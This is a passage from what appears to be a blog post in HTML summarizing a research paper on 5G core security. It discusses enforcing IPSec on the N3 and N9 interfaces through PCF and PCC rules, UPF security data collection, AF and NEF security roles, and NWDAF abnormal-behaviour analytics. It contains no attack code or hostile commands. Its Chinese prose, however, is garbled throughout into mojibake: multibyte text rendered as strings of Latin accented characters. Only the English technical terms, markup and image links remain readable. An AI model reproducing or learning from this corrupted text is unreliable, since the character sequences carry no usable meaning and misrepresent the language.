$\leftrightarrow$ 5G-RANï¼ŒåŸºæ–¼GTPv1-U(GPRS Tunneling Protocol User Plane)<br>N9: UPF $\leftrightarrow$ UPFï¼Œç”¨ä»¥å‚³è¼¸ç”¨æˆ¶å¹³é¢è³‡æ–™ï¼ŒåŸºæ–¼GTPv1-U</p><h4 id="3-2-3-UP-security-enforcement-use-cases"><a href="#3-2-3-UP-security-enforcement-use-cases" class="headerlink" title="3.2.3. UP security enforcement use cases"></a>3.2.3. UP security enforcement use cases</h4><p>ç”¨æ–¼ 5G æ¦‚å¿µçš„ N6-LAN æ‡‰å…è¨± PCF è¨­å®š UPF ä»¥å¯¦ç¾å®‰å…¨æœå‹™åŠŸèƒ½éˆåˆ°æ•¸æ“šç¶²çµ¡<br><img src="https://i.imgur.com/ZkrVdFk.png"></p><blockquote><p> N3 ä»‹é¢ä¿è­·æ©Ÿåˆ¶:  TS33.501 è¡¨æ˜åœ¨N3(UPF $\leftrightarrow$ RAN)é€²è¡Œè³‡æ–™å‚³è¼¸æ‡‰å…·å‚™æ©Ÿå¯†æ€§ã€å®Œæ•´æ€§ã€é‡æ”¾æ”»æ“Šä¿è­·ã€‚æ‰€éœ€æ©Ÿåˆ¶æ˜¯IPSec ESPå’Œ IKEv2 åŸºæ–¼æ†‘è­‰çš„æˆæ¬Šæ©Ÿåˆ¶ï¼Œç„¶è€Œä½¿ç”¨å“ªç¨®å¯†ç¢¼å­¸æ©Ÿåˆ¶ä¾†ä¿è­·N3æ˜¯å–æ±ºæ–¼ç‡Ÿé‹å•†çš„æ±ºå®š</p></blockquote><p>åœ¨ä¸ä¹…çš„å°‡ä¾†ï¼Œå¯ä»¥æ ¹æ“šæä¾›çµ¦ä¸€çµ„ç”¨æˆ¶ã€åˆ‡ç‰‡å’Œ&#x2F;æˆ–ç§Ÿæˆ¶çš„å®‰å…¨ç´šåˆ¥é¸æ“‡æ€§åœ°éƒ¨ç½²é€™äº›é¡å‹çš„è§£æ±ºæ–¹æ¡ˆï¼Œå…·é«”å–æ±ºæ–¼æœå‹™æˆ–åŸºç¤è¨­æ–½çš„è¦æ±‚å’Œé‡è¦æ€§</p><p>èˆ‰ä¾‹ä¾†èªª:<br>ä¾‹å¦‚ï¼Œæœå‹™æ–¼é—œéµåŸºç¤è¨­æ–½ï¼ˆä¾‹å¦‚å…¬ç”¨äº‹æ¥­ï¼‰çš„å°ˆç”¨ç¶²çµ¡ï¼Œæˆ–è»Šè¼‰è‡ªçµ„ç¹”ç¶²çµ¡ï¼ˆVANETï¼‰ï¼Œç•¶ç„¶éœ€è¦å°ç„¡ç·šåŸºåœ°å°å’Œæ ¸ç¶²ä¹‹é–“çš„é€šè¨Šé€²è¡Œå…¨é¢ä¿è­·</p><blockquote><p>Proposal :  æœ¬ç¯‡è«–æ–‡çš„æè­°æ˜¯ï¼›å°‡ç”¨æ–¼N3çš„åŠ å¯†è§£æ±ºæ–¹æ¡ˆåŒ…å«é€²PCCè¦å‰‡ä¸­ï¼Œä¸¦å¼·åˆ¶åŸ·è¡Œæ–¼gNB(via AMF)å’ŒUPFç³»çµ±ä¸­çš„å®‰å…¨é–˜é“å™¨ä¹‹ä¸­(via SMF)å¼·åˆ¶åŸ·è¡Œæ‡‰å»ºç«‹æ–°çš„IPSec Tunnelæˆ–å°‡ PDU åˆ†é…çµ¦ç¾æœ‰çš„ IPSec Tunnel</p></blockquote><p>åŒæ¨£çš„æ¦‚å¿µä¹Ÿå¯æ‡‰ç”¨æ–¼N9ä¸Šä¸€äº›ç”¨ä¾‹æ‰€ä½¿ç”¨çš„å®‰å…¨æ–¹å¼ï¼Œåƒæ˜¯ä¸åŒç‡Ÿé‹å•†ä¹‹é–“äº’ç›¸é€£æ¥ã€‚é€™ç¨®æƒ…æ³ä¸‹ GTPæª¢æŸ¥ä»¥åŠIPSecå·²è¢«æ¨™æº–åŒ–ï¼Œä½†ä¸æ˜¯ä½œç‚ºä¸€å€‹â€å®‰å…¨çš„SLAâ€çš„ä¸€éƒ¨åˆ†é€šéPCFåŸ·è¡Œçš„ï¼Œæ­¤å¤–ï¼Œé€šéæ–°çš„åˆ†æåŠŸèƒ½ï¼ˆå¦‚ NWDAFï¼‰æˆ–è³‡æ–™åº«ï¼ˆå¦‚UDSF,Unstructed Data Storage Functionï¼‰ä¾†å„²å­˜sessionè³‡æ–™æˆ–å¾ UPF æˆ–å…¶ä»–ç‰¹å®šå®‰å…¨åˆ†æå¹³å°ï¼ˆå¯ä»¥é—œè¯ä¾†è‡ªå¤šå€‹ä¾†æºçš„äº‹ä»¶ï¼‰æ¥æ”¶çš„å®‰å…¨äº‹ä»¶ï¼ŒPCF å¯ä»¥å°æŸ¥è©¢ UDR çš„æ—¢å®šå®‰å…¨æœå‹™ç´šåˆ¥å”è­°(Security SLA,SSLA)ä¸­çš„æ›´æ”¹åšå‡ºåæ‡‰ï¼Œæ‡‰ç”¨æ–°çš„å®‰å…¨ç­–ç•¥ï¼Œå¼·åˆ¶å»ºç«‹æ–°çš„æ›´å®‰å…¨çš„ PDUï¼Œå³ç·©è§£è§¸ç™¼æ“ä½œçš„å®‰å…¨å•é¡Œ</p><p><img src="https://i.imgur.com/8ZkUC6D.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ex:</span><br><span class="line">åœ¨æŸå€‹å€åŸŸç¶²çµ¡ä¸­æª¢æ¸¬åˆ°å‡åŸºç«™</span><br><span class="line">æˆ–è€…ç°¡å–®åœ°å¾å®‰å…¨çš„è§’åº¦ä¾†çœ‹æŸå€‹é—œéµå€åŸŸï¼ˆä¾‹å¦‚æ©Ÿå ´ã€é—œéµåŸºç¤è¨­æ–½ç«™é»ç­‰ï¼‰ï¼Œ</span><br><span class="line">PCF å°‡å°è©²ç¶²çµ¡åœ°ç†å€åŸŸä¸­çš„åŸºç«™æ‰€é™„çš„ç›¸é—œ UE/UE çµ„å¯¦æ–½å®Œæ•´æ€§ä¿è­·ã€‚å…¶ä»–ç´„æŸä¹Ÿå¯ä»¥æ§‹å»ºæœ‰æ•ˆçš„ç”¨ä¾‹ï¼ˆä¾‹å¦‚ï¼Œé€£æ¥åˆ°é—œéµåˆ‡ç‰‡çš„ UEï¼‰ã€‚ UE çš„ç­–ç•¥æ‡‰å¾â€œä¸éœ€è¦â€æ›´æ–°ç‚ºâ€œé¦–é¸â€æˆ–â€œéœ€è¦â€</span><br></pre></td></tr></table></figure><p>ä¸‹åœ–ç‚ºPDU Session å»ºç«‹çš„æµç¨‹ï¼Œä»¥ç²—é«”é¡¯ç¤ºæœ¬è«–æ–‡è¦åŸ·è¡Œcall<br>ä»¥æä¾›æ‰€æè¿°çš„ä¾†è‡ª PCF çš„å®‰å…¨ç­–ç•¥çš„å‹•æ…‹å¯¦æ–½</p><p><img src="https://i.imgur.com/pFT8Zpv.png"></p><h3 id="3-2-4-Security-assurance"><a href="#3-2-4-Security-assurance" class="headerlink" title="3.2.4. Security assurance"></a>3.2.4. Security assurance</h3><p>ä¸€æ—¦ä½¿ç”¨å®‰å…¨å±¬æ€§ï¼ˆä¾‹å¦‚ç‰¹å®šæœå‹™æµçš„åŠ å¯†ã€å®Œæ•´æ€§ä¿è­·ã€è¨ªå•æ§åˆ¶ç­–ç•¥ç­‰ï¼‰å»ºç«‹ PDU æœƒè©±ï¼Œå…è¨±åœ¨ç¶²çµ¡ä¸­é€²è¡Œæ“´å±•æ„ç¾©ä¸Šçš„å®‰å…¨å¯¦æ–½ï¼Œä»æœ‰å…©å€‹é—œéµæ–¹é¢å€¼å¾—é—œæ³¨å¯ä»¥è€ƒæ…®ï¼Œå³å®‰å…¨è³‡æ–™æ”¶é›†å’Œcloased-loop automationï¼Œç‚ºäº†ä»‹ç´¹å®ƒå€‘ï¼Œä½¿ç”¨äº†Chargin Function(CHF)åšç‚ºé¡æ¯”</p><p><img src="https://i.imgur.com/SAtlROD.png"></p><p>ä½¿ç”¨è³‡æ–™æ”¶é›†å¯ç”¨æ–¼è¨ˆè²»ã€æ”¶é›†çµ±è¨ˆæ•¸æ“šå’Œç›£æ§æ•´é«”ç¶²çµ¡ä½¿ç”¨æƒ…æ³å’Œ UE è¡Œç‚ºã€‚<br>ç•¶ä½¿ç”¨è€…è¶…å‡ºæŸäº›é–¥å€¼å¾Œ(ex.èŠ±è²»é¡åº¦é™åˆ¶)CHFæœƒå‘ŠçŸ¥PCFï¼Œè€ŒPCFæœƒå°‡æ­¤è€ƒæ…®é€²å‹•æ…‹æ‡‰ç”¨ç›¸é—œç­–ç•¥è‡³user session e.g. çµ¦å®šPDU Sessionçš„QoSé™åˆ¶ã€é‡æ–°å°å‘åˆ°ç‡Ÿé‹å•†ç¶²é ç­‰ç­‰</p><blockquote><p>Proposal: ä½¿ç”¨ä¾†è‡ªUPFä¸­çš„åµŒå…¥å¼å®‰å…¨åŠŸèƒ½çš„å®‰å…¨ç›¸é—œè³‡æ–™ä¾†å¢å¼·&#x2F;è±å¯Œè³‡æ–™æ”¶é›†</p></blockquote><p>SMFè² è²¬å¾UPFæ”¶é›†å¢å¼·&#x2F;è±å¯Œè³‡æ–™ä¸¦å‚³é€åˆ°<strong>ä¸­å¤®å®‰å…¨ç®¡ç†ç³»çµ±</strong> (å„²å­˜è³‡æ–™ï¼Œä¸¦å°‡å…¶èˆ‡ç¶²è·¯ä¸­å„ç¨®å®‰å…¨å°ˆç”¨å¹³å°æ‰€è’é›†çš„å®‰å…¨è³‡è¨Šåšç›¸äº’é—œè¯) e.g. é˜²ç«ç‰†logã€Security telemetryã€IDS Logç­‰ç­‰</p><p>å®‰å…¨ç®¡ç†ç³»çµ±è¦è² è²¬å‰µé€ å®‰å…¨äº‹ä»¶ï¼Œä¸¦åœ¨ PCF å’Œ&#x2F;æˆ– SMF ä¸Šè§¸ç™¼æ“ä½œ<br>e.g. é€šçŸ¥ PCF æŸäº›å®‰å…¨ SLA å·²è¢«è¶Šéï¼Œå°‡ç”¨æˆ¶æµé‡é‡æ–°å°å‘åˆ°ä¾‹å¦‚æ¸…ç†ä¸­å¿ƒæˆ–å°ˆç”¨å®‰å…¨ DN ç­‰ã€‚</p><p>åœ¨ 5G ä¸­ UPF åœ¨ 4G Evolved Packet Core ä¸­æ‰¿æ“”æµé‡æª¢æ¸¬åŠŸèƒ½çš„è§’è‰²ï¼Œå³å°åŒ…æª¢æ¸¬ï¼ˆä¾‹å¦‚åŸºæ–¼æ¥­å‹™æ•¸æ“šæµçš„æ‡‰ç”¨æª¢æ¸¬ï¼‰ï¼Œå› æ­¤å®ƒå¯ä»¥åŸ·è¡Œ PCF ç­–ç•¥ã€‚äº‹å¯¦ä¸Šï¼Œå¯¦ç¾ UPF çš„æŠ€è¡“é›†æˆäº†è¶Šä¾†è¶Šå¤šçš„å®‰å…¨åŠŸèƒ½ï¼Œå¦‚é˜²ç«ç‰†æˆ–é‹ç‡Ÿå•†ç´šç¶²çµ¡åœ°å€è½‰æ›ã€‚</p><p>5G æ ¸å¿ƒå…è¨± PCF åœ¨ç™¼é€åˆ° UE çš„é€£æ¥ç›¸é—œç­–ç•¥å’Œç™¼é€åˆ°ç¶²çµ¡çš„ç­–ç•¥ä¹‹é–“é€²è¡Œå”èª¿ï¼Œé€™äº›ç­–ç•¥å¯ä»¥éƒ¨ç½²åœ¨ç”¨æˆ¶å¹³é¢çš„ UPF ä¸­ï¼Œä¾‹å¦‚åµŒå…¥åœ¨ UPF ä¸­çš„ L7 é˜²ç«ç‰†ä¸­çš„å®‰å…¨ç­–ç•¥ï¼Œç”¨æ–¼é‡å°ç‰¹å®šç”¨æˆ¶çš„ç‰¹å®šæœå‹™ã€‚ä»¥ä¸‹å…©å€‹ç”¨ä¾‹èªªæ˜äº†é€™å€‹æ¦‚å¿µï¼š</p><h3 id="use-case1"><a href="#use-case1" class="headerlink" title="use case1"></a>use case1</h3><p>æ ¹æ“š3GPP TS 23.503ï¼ŒPCFæ”¯æ´çš„ç”¨æ–¼PDU Sessionçš„SMF é¸æ“‡ç®¡ç†(Selection Management)çš„åŠŸèƒ½ä¹‹ä¸€æ˜¯ï¼Œå‘AMFæä¾›ç­–ç•¥ä»¥é€šçŸ¥PCFå»é‡å°ç‰¹å®šDNNåŸ·è¡ŒDNN replacementï¼Œæ­¤é¡replacementæ“ä½œçš„è§¸ç™¼å™¨ï¼Œå¯èƒ½æ˜¯ç”±æ–¼å®‰å…¨äº‹ä»¶è€Œå—æçš„DNNï¼Œç”±æ–¼ç‰¹å®šDNæˆ–åˆ‡ç‰‡éè¼‰(ex. DDoS)ï¼Œè€Œé€šéNWADFå ±å‘Šçµ¦PCF</p><h3 id="use-case2"><a href="#use-case2" class="headerlink" title="use case2"></a>use case2</h3><p>ç•¶ SMF æ”¶åˆ° PCC è¦å‰‡æ™‚ï¼ŒSMF å¯ä»¥æ¡å–æªæ–½é‡æ–°è¨­å®š PDU çš„ UPã€‚é€™äº›è¡Œå‹•ä¹‹ä¸€å¯ä»¥æ˜¯ä½¿ç”¨æ–°çš„æŒ‡å°è¦å‰‡ä¾†æ›´æ–°UPFï¼Œä¾‹å¦‚å°‡æŸäº›å¯ç–‘æµé‡è½‰ç™¼åˆ°æœ¬åœ°è³‡æ–™ä¸­å¿ƒ(Ex. MEC)ï¼Œç›®çš„æ˜¯åœ¨ç¶²è·¯ä¸­çš„å°å‹å—æ§å€åŸŸå…§éåˆ¶æ½›åœ¨çš„å®‰å…¨æ¼æ´</p><p>MEC çš„æ¦‚å¿µæ˜¯ä¿ƒé€² UPF åœ¨ç¶²çµ¡é‚Šç·£çš„éƒ¨ç½²ï¼Œæ›´é è¿‘ UEï¼Œæœ‰æ™‚ç”¨æ–¼é—œéµæ‡‰ç”¨ç¨‹åº<br>e.g. Ultra Low Level latency use caseã€å¿«å–ã€é«”è‚²å ´é¤¨ç­‰</p><p>ä½œç‚ºå°äº‹ä»¶çš„éŸ¿æ‡‰(response)ï¼Œæ‡‰ç”¨åŠŸèƒ½(Application Function,AF)å¯ä»¥å‘5Gæ ¸ç¶²(i.e PCF or via Network Exposure Function(NEF))ç™¼å‡ºè«‹æ±‚ï¼Œå·²å°‡ä¸€çµ„UEç”šè‡³æ•´å€‹åˆ‡ç‰‡çš„æµé‡å¼•å°è‡³ä½æ–¼é‚Šç·£çš„UPFï¼Œå¯ä»¥éƒ¨ç½² DDoS ä¿è­·ã€æ¸…æ´—ä¸­å¿ƒã€IDS&#x2F;IPS ç­‰å®‰å…¨åŠŸèƒ½ä½œç‚ºéåˆ¶æ©Ÿåˆ¶ã€‚</p><blockquote><p>AFåŠŸèƒ½: AFsèˆ‡3GPP æ ¸ç¶²äº’å‹•ï¼Œä»¥æä¾›æœå‹™:åƒæ˜¯æ‡‰ç”¨ç¨‹å¼å°æµé‡è·¯ç”±çš„å½±éŸ¿ã€å­˜å–NEFã€èˆ‡ç­–ç•¥æ¡†æ¶äº’å‹•(è—‰ç”±N5)ç­‰ç­‰ i.e. å®ƒè«‹æ±‚å‹•æ…‹ç­–ç•¥<br>å¦‚ä»Šï¼ŒAF ä½œç‚º MEC èª¿åº¦æ‡‰ç”¨ç¨‹å¼æˆ– IP Multimedia System (IMS)ã€‚</p></blockquote><blockquote><p>Proposal: å°‡ AF çš„ç¯„åœæ“´å±•åˆ°å®‰å…¨æ‡‰ç”¨ï¼š</p></blockquote><ul><li>å°æ–¼æµé‡è·¯ç”±(traffic routing)çš„å½±éŸ¿ä½œç‚ºå®‰å…¨ç·©è§£æ©Ÿåˆ¶<br>èˆ‰ä¾‹:æ¸¬åˆ°æ”»æ“Šï¼ˆä¾‹å¦‚ DDoSï¼‰æ™‚çš„ BGP Injection å’Œè·¯ç”±è®Šæ›´</li><li>è—‰ç”±NEFå­˜å–5Gæ ¸ç¶²<br>èˆ‰ä¾‹:æä¾›å¨è„…æƒ…å ±æºçš„ç¬¬ä¸‰æ–¹å®‰å…¨å…¬å¸</li><li>èˆ‡ç­–ç•¥æ¡†æ¶çš„äº’å‹•<br>èˆ‰ä¾‹: ç”±æ–¼ä¸å¯é æ¸¬çš„å®‰å…¨äº‹ä»¶æˆ–ç”±æ–¼æ–°çš„å¨è„…ç°½åè€Œæä¾›æ–°çš„ SDF éæ¿¾è¦å‰‡çš„ç­–ç•¥è®Šæ›´</li></ul><h3 id="3-3-Establishing-security-policies-as-part-of-PCC-rules"><a href="#3-3-Establishing-security-policies-as-part-of-PCC-rules" class="headerlink" title="3.3. Establishing security policies as part of PCC rules"></a>3.3. Establishing security policies as part of PCC rules</h3><p>PCCè¦å‰‡å°‡ <strong>SDFæ¨¡æ¿</strong>(æœå‹™è³‡æ–™filterçš„åˆ—è¡¨æˆ–æ‡‰ç”¨ç¨‹å¼filterçš„æ‡‰ç”¨ç¨‹å¼ID)<br>ä»¥åŠå°æµé‡çš„å¯èƒ½æ“ä½œ(ç­–ç•¥å¯¦æ–½)é€£æ¥èµ·ä¾†</p><p>ä»¥ 3GPP æå‡ºçš„ç•¶å‰è¡Œå‹•ç‚ºåŸºç¤ï¼Œå°ˆæ³¨æ–¼ç´”ç²¹çš„QoS actionsï¼Œæˆ‘å€‘å»ºè­°å‡ºæ–¼å®‰å…¨ç›®çš„æ“´å±•å’Œæ‡‰ç”¨é€™äº›actionsï¼Œä¸¦æ­¸ç´æˆè¡¨ 1</p><p><img src="https://i.imgur.com/gXZeTff.png"></p><p>3GPP TS 23.503çš„6.3.1è¡¨æ ¼åˆ—å‡ºäº†PCCè¦å‰‡ä¸­åŒ…å«çš„è³‡è¨Šï¼Œåƒæ˜¯è³‡è¨Šåç¨±(information name)<br>ã€æè¿°(description)ã€ä»¥åŠPCCæ˜¯å¦å¯åœ¨SMFå…§è¢«å•Ÿç”¨çš„Dynamic PCCè¦å‰‡ä¹‹ä¸­ä¿®æ”¹æ­¤è³‡è¨Š</p><p>è¡¨2 é¡¯ç¤º TS 23.503çš„6.3.1è¡¨æ ¼çš„æ‘˜éŒ„<br><img src="https://i.imgur.com/a7jUM1v.png"><br>è¡¨æ ¼ä¸­çš„ç°è‰²å€åŸŸé¡¯ç¤ºäº†åœ¨åŸæ¨™æº–ä¸Šå¢æ·»çš„å…ƒç´ </p><p>åœ¨â€Securityâ€é¡åˆ¥ä¸­ï¼Œæœ‰å…©é …Information Elementsï¼Œé€™å…©é …å…ƒç´ æ¶‰åŠç›®å‰åœ¨ç”¨æˆ¶å¹³é¢ä¸­å­˜åœ¨çš„å®‰å…¨ç­–ç•¥ï¼Œä½†ç›®å‰åƒ…åœ¨SMFä¸­é€²è¡Œæœ¬åœ°ç®¡ç†ä¸”åƒ…é™æ–¼Access Network(AN)<br>æˆ‘å€‘çš„è²¢ç»æ˜¯ä½¿å®ƒå€‘æˆç‚º PCC è¦å‰‡çµæ§‹çš„ä¸€éƒ¨åˆ†ï¼š</p><ul><li><p>ä»¥PDUçš„å±¤ç´šä¾†çœ‹ï¼ŒPCF é‚„å¯ä»¥æ§åˆ¶ PDU Sessionçš„ä¸åŒåƒæ•¸ï¼Œå…¶ä¸­åŒ…æ‹¬ SMF å¾ PDU Sessionä¸­ç²å–æ–°ç­–ç•¥çš„æ¢ä»¶ï¼ˆç­–ç•¥æ§åˆ¶è«‹æ±‚çš„è§¸ç™¼å™¨ï¼‰ï¼Œè€Œé€™äº›æ¢ä»¶å°æ–¼å®šç¾©å®‰å…¨ç”¨ä¾‹ååˆ†é‡è¦ i.e.<br>è‹¥é€™äº›æ¢ä»¶æ˜¯å®‰å…¨è§¸ç™¼å™¨(e.g.æ„å¤–äº‹ä»¶ã€éè¼‰ã€è¶…å‡ºé–¥å€¼ç­‰)ï¼Œå‰‡PCC å®‰å…¨è¦å‰‡å°‡å¾ PCF å‚³é”åˆ° SMFï¼Œä¸¦åœ¨ UPF å’Œ&#x2F;æˆ– 5G-RANä¸­åŸ·è¡Œã€‚</p></li><li><p>PDU Sessionç›¸é—œç­–ç•¥è³‡è¨Šçš„ç›®çš„æ˜¯æä¾›åˆ†åˆ¥é©ç”¨æ–¼å–®å€‹ç›£æ§é‡‘é‘°åŒ™æˆ–æ•´å€‹PDU Sessionçš„PCC(Policy and charging control)ï¼ŒPCF å¯ä»¥å°‡ PDU æœƒè©±ç›¸é—œçš„ç­–ç•¥è¨Šæ¯èˆ‡ PCC è¦å‰‡ä¸€èµ·æˆ–å–®ç¨æä¾›çµ¦ SMF</p></li></ul><p>TS 23.503çš„6.4-1è¡¨æ ¼åŒ…å«äº†PDU Sessionç›¸é—œçš„ç­–ç•¥è³‡è¨Š<br>è¡¨3 é¡¯ç¤º TS 23.503çš„6.4-1è¡¨æ ¼çš„æ‘˜éŒ„ï¼Œé‡é»é—œæ³¨ä½¿ç”¨ç›£æ§æ§åˆ¶ç›¸é—œè¨Šæ¯ï¼Œå…¶ä¸­æå‡ºäº†å…©å€‹æ–°çš„ç›£æ§å¯†é‘°ç”¨æ–¼ (D)DoS æ”»æ“Šæª¢æ¸¬ã€‚<br><img src="https://i.imgur.com/B6DC660.png"></p><p><span class="special">æœ€å¾Œï¼ŒPCF é‚„æ‡‰æŒ‡ç¤º SMF æª¢æ¸¬å“ªäº›æ‡‰ç”¨ç¨‹åºã€‚åœ¨æ”¶åˆ°ä¾†è‡ª SMF çš„å ±å‘Šå¾Œï¼ŒPCF å¯ä»¥åšå‡ºç­–ç•¥æ±ºå®šä¸¦å‘ SMF ç™¼é€æ›´æ–°çš„æˆ–æ–°çš„ PCC è¦å‰‡ã€‚å¦‚æœç¶²çµ¡ä¸­çš„ç‰¹å®šå®‰å…¨åˆ†æèƒ½å¤ å®šç¾©æ”»æ“Šï¼Œå‰‡æ‡‰å°‡ç›¸åŒçš„éç¨‹æ‡‰ç”¨æ–¼å®‰å…¨ (e.g. åœ¨bot èˆ‡ C&amp;Cä¸­å¿ƒä¹‹é–“çš„é€šè¨Š)æˆ–ç‰¹å¾µåŒ–å®‰å…¨äº‹ä»¶æ¦‚æ³ (e.g. æ„åœ–åœ¨é€šè¨Šä¸­ä½¿ç”¨æŒ‡å®šå”è­°çš„ç„¡æ•ˆportä¾†ç ´å£å­˜å–æ§åˆ¶é˜²ç«ç‰†è¦å‰‡ )</span><br>å› æ­¤ï¼Œå¯ä»¥åƒä»»ä½•å…¶ä»–æ‡‰ç”¨ç¨‹åºç°½åä¸€æ¨£å‰µå»ºå®‰å…¨ç°½åï¼Œä¸¦æ‡‰ç”¨ç›¸æ‡‰çš„ PCC è¦å‰‡ã€‚</p><h3 id="3-4-Security-analytics-implemented-in-NWDAF"><a href="#3-4-Security-analytics-implemented-in-NWDAF" class="headerlink" title="3.4. Security analytics implemented in NWDAF"></a>3.4. Security analytics implemented in NWDAF</h3><p><img src="https://i.imgur.com/pp10sLI.png"></p><p>NWDAF æä¾›çš„è¨Šæ¯å¯ä»¥å° PCF åŸ·è¡Œçš„ PCC æ±ºç­–éç¨‹åšå‡ºé‡å¤§è²¢ç»</p><p>ç„¶è€Œï¼Œåˆ†æè¨Šæ¯ç›®å‰åƒ…é™æ–¼åˆ‡ç‰‡ç‰¹å®šçš„ç¶²çµ¡ç‹€æ…‹ï¼Œä¾‹å¦‚è² è¼‰ç´šåˆ¥è¨Šæ¯ã€‚å³ï¼Œä¸éœ€è¦çŸ¥é“ä½¿ç”¨åˆ‡ç‰‡çš„è¨‚æˆ¶ï¼Œä½†å®ƒåœ¨ç¶²çµ¡åˆ‡ç‰‡ç´šåˆ¥å·¥ä½œ</p><blockquote><p>Proposal: æ“´å±•è² è¼‰ç´šåˆ¥è¨Šæ¯ï¼Œæ·»åŠ å®‰å…¨ä¸Šä¸‹æ–‡è¨Šæ¯ï¼ˆä¾‹å¦‚äº‹ä»¶ã€æ”»æ“Šã€æ¼æ´ç­‰ï¼‰</p></blockquote><p>å®ƒéœ€è¦å°‡å–®ç¨å¯¦æ–½çš„å®‰å…¨åŠŸèƒ½æˆ–ä½œç‚ºæ¨™æº–åŒ–ç¶²çµ¡åŠŸèƒ½çš„ä¸€éƒ¨åˆ†ï¼ˆä¾‹å¦‚å…·æœ‰åµŒå…¥å¼é˜²ç«ç‰†åŠŸèƒ½çš„ UPFï¼‰æä¾›çµ¦ NWDAF æˆ–ä¸­é–“å°ˆç”¨å®‰å…¨åˆ†æå¹³å°ã€‚</p><p>æ¨™æº– TS 23.288 [11] ç‚ºä¸åŒé¡å‹çš„ NWDAF æä¾›äº†å¯èƒ½æ€§ï¼Œå°ˆé–€ç”¨æ–¼ä¸åŒé¡å‹çš„åˆ†æï¼Œç”±Analytics ID Information Element æ‰€æ¨™è­˜ã€‚</p><p>PCF å¯ä»¥é€šé N23 æ¥å£ä½¿ç”¨æ­¤è¨Šæ¯ã€‚å…¶ä¸­ä¸€äº›è¨Šæ¯å·²ç¶“å¯ä»¥ç‚ºå®‰å…¨åˆ†æå’Œé€²ä¸€æ­¥å¯¦æ–½æä¾›éå¸¸æœ‰ç”¨çš„è¨Šæ¯ï¼Œå¦‚å‰å¹¾ç¯€æ‰€è¿°ã€‚</p><p>[11] çš„è¡¨ 7.1-2 é¡¯ç¤ºäº† NWDAF æœå‹™æä¾›çš„åˆ†æè¨Šæ¯ã€‚æˆ‘å€‘åœ¨æ­¤è¡¨ä¸­æ·»åŠ äº†ä¸€åˆ—ï¼Œå…¶ä¸­åŒ…å«å¯èƒ½è¢«æå–åˆ°å…¶ä»–å®‰å…¨åˆ†æåŠŸèƒ½ä»¥é€²è¡Œé€²ä¸€æ­¥åˆ†ææˆ–ç›´æ¥æå–åˆ° PCF æ¡†æ¶ä»¥æ‡‰ç”¨ç‰¹å®šå®‰å…¨ PCC è¦å‰‡çš„å®‰å…¨è³‡è¨Šï¼ˆåƒè¦‹è¡¨ 4ï¼‰ã€‚</p><p><img src="https://i.imgur.com/URrNthl.png"></p><p>å®‰å…¨åˆ†æç‰¹åˆ¥æœ‰è¶£çš„æ˜¯ NWDAF æ•ç²çš„èˆ‡ç•°å¸¸è¡Œç‚ºç›¸é—œçš„ç¶²çµ¡æ•¸æ“šåˆ†æã€‚</p><p>PCF å¯ä»¥ä½¿ç”¨ <strong>Nnwdaf_AnalyticsSubscription_Subscribe</strong> æœå‹™æ“ä½œå»è¨‚é–±èˆ‡ â€œç•°å¸¸è¡Œç‚ºâ€ ç›¸é—œçš„ç¶²çµ¡åˆ†æé€šçŸ¥ï¼Œç›®çš„æ˜¯é æ¸¬å’Œæª¢æ¸¬å®‰å…¨å•é¡Œã€è§¸ç™¼æ–°çš„å®‰å…¨ç­–ç•¥æˆ–æ›´æ–°ç‰¹å®š UE æˆ– UE çµ„çš„ç¾æœ‰å®‰å…¨ç­–ç•¥ã€‚ è©²å°åŒ…æ‹¬Analytics IDï¼ˆâ€Abnormal behaviourâ€ï¼‰ã€åˆ†æå ±å‘Šç›®æ¨™<strong>SUPI</strong>ã€<strong>Internal Group ID</strong> å’Œåˆ†æéæ¿¾å™¨(filter)ï¼ŒåŒ…æ‹¬ç•°å¸¸ ID åˆ—è¡¨å’Œæ¯å€‹ç•°å¸¸ ID çš„å¯èƒ½é–¾å€¼</p><p>å‰çš„ç•°å¸¸ ID åˆ—è¡¨åœ¨ [11] ä¸­æŒ‡å®šï¼Œä¾‹å¦‚â€œæ„å¤–çš„ UE ä½ç½®â€ã€â€œæ‡·ç–‘ DDoS æ”»æ“Šâ€ã€â€œéŒ¯èª¤çš„ç›®æ¨™åœ°å€â€ç­‰ã€‚æ¨™æº–çš„è¡¨ 6.7.5.3-3 æä¾›äº†æ¸›è¼•é¢¨éšªçš„ç­–ç•¥å’Œè¡Œå‹•ç¤ºä¾‹ï¼Œä¾‹å¦‚â€œæ“´å±•æœå‹™å€é™åˆ¶â€ã€â€œé‡‹æ”¾ PDU æœƒè©±â€ã€â€œæ›´æ–°å°åŒ…éæ¿¾å™¨&#x2F;QoSâ€ç­‰ã€‚</p><p>å¦‚æœ¬æ–‡æª”ç¬¬ 2.4 ç¯€æ‰€è¿°ï¼ŒæŒ‘æˆ°åœ¨æ–¼ï¼Œåœ¨ç”¨æˆ¶å¹³é¢ç´šåˆ¥ï¼Œæ¯å€‹æ‡‰ç”¨ç¨‹åºçš„é€šä¿¡æè¿°åƒ…é™æ–¼è©²é€šä¿¡çš„æµé‡å’Œæ•¸æ“šé€Ÿç‡ï¼Œèˆ‡é«”ç©é¡å‹çš„æ”»æ“Šï¼ˆä¾‹å¦‚æ°¾æ¿«ã€éè¼‰ã€DoS ç­‰ï¼‰ã€‚</p><p>çµ±è¨ˆæˆ–é æ¸¬ä¸­çš„è®ŠåŒ–æˆ–ç•°å¸¸ï¼Œä¾‹å¦‚ UE é€šä¿¡çš„å‘¨æœŸã€é€šä¿¡æŒçºŒæ™‚é–“æˆ–æŸäº›æµé‡ç‰¹å¾µï¼ˆä¾‹å¦‚ç•°å¸¸ç«¯å£ã€å¯ç–‘ DNNã€å…¶ä»–æœ‰ç”¨è¨Šæ¯ç­‰ï¼‰ã€ä¸Šå‚³&#x2F;ä¸‹è¼‰é‡ï¼ˆå¹³å‡å€¼å’Œæ–¹å·®ï¼‰ ) å¯èƒ½è¡¨ç¤ºå®‰å…¨äº‹ä»¶æˆ–äº‹æ•…ã€‚</p><p>åœ¨ç”¨æˆ¶å¹³é¢å±¤é¢ï¼Œæ–°ææ¡ˆåŒ…æ‹¬ï¼Œé™¤äº†æ•¸é‡ã€è®ŠåŒ–å’Œç•°å¸¸ä¹‹å¤–ï¼ŒNWDAF å¯ä»¥ç›´æ¥å¾ UPF 